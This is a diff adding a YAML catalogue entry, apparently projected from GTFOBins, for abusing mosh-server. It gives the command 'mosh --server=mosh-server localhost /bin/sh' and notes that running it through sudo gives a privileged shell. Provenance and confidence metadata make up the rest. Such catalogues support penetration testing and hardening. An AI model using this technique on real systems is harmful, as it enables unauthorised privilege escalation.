@@ -1,0 +1,81 @@
+id: gtfobins/mosh-server/shell/sudo
+type: binary
+platform: linux
+name: mosh-server
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: mosh --server=mosh-server localhost /bin/sh
+  comment: 'This requires a valid SSH access.
+
+
+    The `mosh-server` has to be executed via `sudo`, e.g., `''--server=sudo mosh-server''`.'
+references:
+- https://gtfobins.github.io/gtfobins/mosh-server/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        mosh-server:
+          functions:
+            shell:
+            - code: mosh --server=mosh-server localhost /bin/sh
+              comment: This requires a valid SSH access.
+              contexts:
+                sudo:
+                  comment: The `mosh-server` has to be executed via `sudo`, e.g., `'--server=sudo mosh-server'`.
+    upstream_url: https://gtfobins.github.io/gtfobins/mosh-server/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:5dd659236505b73e342c781df69977a68ae4bf967cf7e2e63c8920379e0a216f
